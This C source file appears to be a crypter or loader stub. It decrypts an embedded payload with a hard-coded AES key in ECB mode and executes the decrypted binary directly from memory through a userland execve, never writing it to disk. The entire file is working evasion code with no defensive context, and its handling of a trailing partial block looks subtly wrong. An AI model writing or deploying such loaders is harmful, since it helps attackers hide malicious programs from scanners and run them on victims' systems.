#define _GNU_SOURCE

#include <aes.h>
#include <errno.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#include "config.h"
#include "execve.h"
#include "payload.h"

void aes_decrypt(unsigned char** plaintext);
int main(int argc, char* argv[], char* envp[]);

void aes_decrypt(unsigned char** plaintext)
{
    int i = 0;
    struct AES_ctx ctx;
    unsigned char buf[AES_BLOCKLEN];
    const uint8_t remainder = plaintext_len % AES_BLOCKLEN;

    if (aes_key_len != 16 && aes_key_len != 24 && aes_key_len != 32) {
        fprintf(stderr, "Invalid key size: %ld\n", aes_key_len);
        exit(1);
    }

    if (payload_data_len % AES_BLOCKLEN != 0) {
        fprintf(stderr, "Ciphertext is not a multiple of the AES blocksize\n");
        exit(1);
    }

    AES_init_ctx(&ctx, aes_key);
    memcpy(*plaintext, payload_data, plaintext_len);
    while ((unsigned int)i < plaintext_len - remainder) {
        AES_ECB_decrypt(&ctx, *plaintext + i);
        i += AES_BLOCKLEN;
    }

    if (remainder > 0) {
        memcpy(buf, *plaintext + i, remainder);
        AES_ECB_decrypt(&ctx, buf);
        memcpy(*plaintext + i, buf, remainder);
    }
}

int main(int argc, char* argv[], char* envp[])
{
    unsigned char* plaintext;

    plaintext = malloc(plaintext_len);
    aes_decrypt(&plaintext);

    char const *errstr = NULL;
    if (ulexecve(plaintext, plaintext_len, argv, envp, &errstr) < 0) {
        if (*errstr) {
            fprintf(stderr, "ulexecve(): %s\n", errstr);
        } else {
            fprintf(stderr, "ulexecve() failed\n");
        }
        exit(EXIT_FAILURE);
    }

    return 0;
}